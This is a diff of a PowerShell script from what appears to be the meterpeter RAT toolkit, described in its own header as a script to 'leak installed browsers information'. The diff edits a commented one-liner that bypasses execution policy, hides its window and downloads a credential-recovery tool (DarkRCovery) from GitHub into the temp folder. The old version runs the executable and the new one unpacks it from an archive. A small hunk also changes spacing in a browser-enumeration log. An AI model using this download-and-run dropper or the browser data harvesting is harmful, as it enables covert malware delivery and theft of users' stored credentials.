@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
   Standalone Powershell Script to Leak Installed Browsers Information.
 
@@ -75,7 +75,8 @@
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
 
-# powershell -executionpolicy bypass -w 1 -command (New-Object System.Net.WebClient).DownloadFile("https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe","$env:tmp\DarkRCovery.exe");(New-Object -com Shell.Application).ShellExecute("$env:tmp\DarkRCovery.exe")
+# powershell -executionpolicy bypass -w 1 -command (New-Object System.Net.WebClient).DownloadFile("https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.rar","$env:tmp\DarkRCovery.rar");cmd /R set unrar="%programFiles%\WinRAR\UnRAR.exe" && cd %tmp% && %unrar% e "DarkRCovery.rar"
+
 
 # param (
 #  [Parameter(Mandatory=$true,Position=0)]$IE,
@@ -242,7 +243,7 @@ function BROWSER_RECON {
     echo "-------   -------   ------   -------         ----------" >> $LogFilePath\BrowserEnum.log
     echo "IE        $IEfound  $iStatus   $IEVersion    $id" >> $LogFilePath\BrowserEnum.log
     echo "CHROME    $CHfound  $cStatus   $Chrome_App   $cd" >> $LogFilePath\BrowserEnum.log
-    echo "FIREFOX   $FFfound  $fStatus   $ParsingData          $fd" >> $LogFilePath\BrowserEnum.log
+    echo "FIREFOX   $FFfound  $fStatus   $ParsingData            $fd" >> $LogFilePath\BrowserEnum.log
     ## Get-NetAdapter { Interfaces Available }
     $Interfaces = Get-NetAdapter|Select-Object Status,InterfaceDescription -ErrorAction SilentlyContinue
     If($Interfaces){echo "`n" $Interfaces >> $LogFilePath\BrowserEnum.log}
